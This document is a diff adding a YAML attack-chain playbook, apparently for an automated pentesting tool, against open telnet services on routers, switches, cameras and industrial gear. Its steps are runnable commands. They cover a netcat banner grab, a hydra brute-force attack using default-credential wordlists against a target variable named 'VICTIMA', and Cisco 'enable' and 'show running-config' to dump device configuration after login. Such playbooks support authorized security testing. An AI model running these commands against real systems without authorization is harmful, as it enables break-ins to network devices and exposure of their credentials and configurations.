@@ -1,0 +1,39 @@
+chain_id: telnet_open
+title: "Telnet — manual probe + brute force (still alive on legacy gear)"
+severity: MEDIUM
+tags: [telnet, default-creds, brute-force, legacy]
+
+trigger:
+  any_of:
+    - { port: 23 }
+    - { service: telnet }
+    - { service_pattern: "(?i)telnet" }
+
+description: |
+  Open telnet. Dead protocol on the public internet, but very much alive
+  on internal switches, routers, IPMI, DVR/IP-camera boxes, and legacy
+  industrial gear. Banner alone often reveals the vendor; default
+  credentials follow.
+
+steps:
+  - id: 1
+    title: "Banner grab — fingerprint the appliance"
+    command: |
+      nc $VICTIMA 23 < /dev/null
+      # Or with timeout to capture motd / login prompt:
+      timeout 5 telnet $VICTIMA
+
+  - id: 2
+    title: "Brute-force common defaults (cisco/cisco, admin/admin, root/root, ...)"
+    command: hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $VICTIMA telnet
+
+  - id: 3
+    title: "On a successful login, escalate via vendor IOS / shell tricks"
+    command: |
+      # Cisco IOS:
+      enable
+      # Often blank or `cisco`. Then:
+      show running-config
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet
